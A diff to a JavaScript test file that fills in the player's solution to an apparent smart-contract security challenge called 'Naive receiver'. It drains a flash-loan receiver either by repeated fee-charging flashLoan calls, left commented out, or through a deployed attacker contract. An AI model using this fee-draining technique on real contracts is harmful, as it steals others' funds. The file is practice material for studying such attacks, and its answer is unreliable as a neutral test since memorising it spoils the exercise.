@@ -38,6 +38,29 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        /*
+         * The logic is that each time we call a flashLoan, we pay 1 ETH of fees
+         * Option 1: Calling 10 times will result in 10 ETH of fees, effectively draining the receiver
+         */
+        // const ETH = await pool.ETH();
+        // await pool.connect(player).flashLoan(receiver.address, ETH, ETHER_IN_RECEIVER, "0x");
+        // await pool.connect(player).flashLoan(receiver.address, ETH, ETHER_IN_RECEIVER, "0x");
+        // await pool.connect(player).flashLoan(receiver.address, ETH, ETHER_IN_RECEIVER, "0x");
+        // await pool.connect(player).flashLoan(receiver.address, ETH, ETHER_IN_RECEIVER, "0x");
+        // await pool.connect(player).flashLoan(receiver.address, ETH, ETHER_IN_RECEIVER, "0x");
+        // await pool.connect(player).flashLoan(receiver.address, ETH, ETHER_IN_RECEIVER, "0x");
+        // await pool.connect(player).flashLoan(receiver.address, ETH, ETHER_IN_RECEIVER, "0x");
+        // await pool.connect(player).flashLoan(receiver.address, ETH, ETHER_IN_RECEIVER, "0x");
+        // await pool.connect(player).flashLoan(receiver.address, ETH, ETHER_IN_RECEIVER, "0x");
+        // await pool.connect(player).flashLoan(receiver.address, ETH, ETHER_IN_RECEIVER, "0x");
+
+        /*
+         * Option 2: Creating an attacker contract that will call the flashloan until the receiver is drained
+         */
+        const attackContract = await ethers.getContractFactory('NaiveReceiverAttacker', player);
+        const attacker = await attackContract.deploy();
+        await attacker.connect(player).attack(pool.address, receiver.address);
+
     });
 
     after(async function () {
